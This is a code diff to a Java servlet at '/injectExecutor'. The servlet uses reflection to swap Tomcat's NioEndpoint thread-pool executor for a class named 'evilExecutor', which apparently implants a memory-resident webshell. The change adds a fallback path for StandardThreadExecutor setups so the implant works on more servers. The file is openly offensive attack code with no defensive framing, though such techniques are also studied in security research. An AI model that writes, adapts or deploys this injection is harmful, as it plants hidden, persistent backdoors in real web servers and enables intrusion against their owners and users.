@@ -6,7 +6,9 @@ import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
+import java.lang.ClassCastException;
 
+import org.apache.catalina.core.StandardThreadExecutor;
 import org.apache.tomcat.util.net.NioEndpoint;
 import org.apache.tomcat.util.threads.ThreadPoolExecutor;
 
@@ -21,7 +23,6 @@ import org.apache.coyote.Response;
 import org.apache.tomcat.util.net.SocketWrapperBase;
 import java.nio.charset.StandardCharsets;
 import java.net.URLEncoder;
-import java.util.concurrent.RejectedExecutionHandler;
 
 
 @WebServlet("/injectExecutor")
@@ -29,13 +30,32 @@ public class InjectExecutor extends HttpServlet {
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
         NioEndpoint endpoint = (NioEndpoint) getStandardService();
-        ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(endpoint, "executor");
-        ThreadPoolExecutor exe = new evilExecutor(
-                exec.getCorePoolSize(), exec.getMaximumPoolSize(),
-                exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS,
-                exec.getQueue(), exec.getThreadFactory(),
-                exec.getRejectedExecutionHandler());
-        endpoint.setExecutor(exe);
+
+        try {
+            ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(endpoint, "executor");
+            ThreadPoolExecutor exe = new evilExecutor(
+                    exec.getCorePoolSize(),
+                    exec.getMaximumPoolSize(),
+                    exec.getKeepAliveTime(TimeUnit.MILLISECONDS),
+                    TimeUnit.MILLISECONDS,
+                    exec.getQueue(),
+                    exec.getThreadFactory(),
+                    exec.getRejectedExecutionHandler());
+            endpoint.setExecutor(exe);
+        } catch (ClassCastException e) {
+            System.out.println("触发java.lang.ClassCastException");
+            StandardThreadExecutor standardexec = (StandardThreadExecutor) getField(endpoint, "executor");
+            ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(standardexec, "executor");
+            ThreadPoolExecutor exe = new evilExecutor(
+                    exec.getCorePoolSize(),
+                    exec.getMaximumPoolSize(),
+                    exec.getKeepAliveTime(TimeUnit.MILLISECONDS),
+                    TimeUnit.MILLISECONDS,
+                    exec.getQueue(),
+                    exec.getThreadFactory(),
+                    exec.getRejectedExecutionHandler());
+            endpoint.setExecutor(exe);
+        }
 
 
     }
